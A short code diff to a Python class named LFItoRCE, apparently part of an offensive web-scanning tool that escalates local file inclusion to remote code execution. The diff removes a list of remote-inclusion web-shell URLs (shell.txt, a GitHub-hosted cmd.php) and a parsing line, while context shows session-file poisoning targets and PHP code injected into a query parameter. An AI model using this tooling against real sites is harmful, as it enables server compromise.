@@ -69,14 +69,6 @@ class LFItoRCE:
         "/var/tmp/sess_",
     ]
 
-    # RFI Targets
-
-    RFI_TARGETS = [
-        "http://127.0.0.1:80/shell.txt",
-        "http://127.0.0.1:8080/shell.txt",
-        "https://raw.githubusercontent.com/username/shell/main/cmd.php",
-    ]
-
     async def _send_lfi(self, base_url: str, param: str, traversal: str,
                          timeout: int = 8) -> dict:
         """Send LFI payload appended to base URL or injected into param."""
@@ -283,7 +275,6 @@ class LFItoRCE:
             try:
                 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
                 parts = urlparse(base_url)
-                query = parse_qsl(parts.query, keep_blank_values=True)
                 poison_url = urlunparse((parts.scheme, parts.netloc, parts.path,
                                          urlencode([(pp, php_code)]), parts.fragment))
                 r = await self.engine.ahttp_send(poison_url, timeout=5,
